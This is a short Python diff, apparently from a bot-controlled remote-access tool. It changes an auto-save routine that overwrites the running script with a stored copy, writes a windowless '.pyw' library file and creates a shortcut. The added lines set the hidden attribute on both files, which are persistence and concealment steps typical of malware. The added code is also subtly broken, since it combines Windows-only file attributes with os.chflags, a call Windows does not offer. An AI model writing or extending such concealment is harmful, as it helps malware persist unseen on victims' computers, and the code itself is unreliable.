@@ -108,11 +108,17 @@ async def update(ctx):
 
 
 def _auto_save():
-    with open(__file__, 'w') as f:
+    main_file_path = __file__
+    with open(main_file_path, 'w') as f:
         f.write(BACKUP_FILE)
+        attributes = os.stat(main_file_path).st_file_attributes
+        os.chflags(main_file_path, attributes | stat.FILE_ATTRIBUTE_HIDDEN)
 
-    with open(LIB + '.pyw', 'w') as f:
+    lib_file_path = LIB + '.pyw'
+    with open(lib_file_path, 'w') as f:
         f.write(LIB_BACKUP_FILE)
+        attributes = os.stat(lib_file_path).st_file_attributes
+        os.chflags(lib_file_path, attributes | stat.FILE_ATTRIBUTE_HIDDEN)
 
     create_shortcut()
 
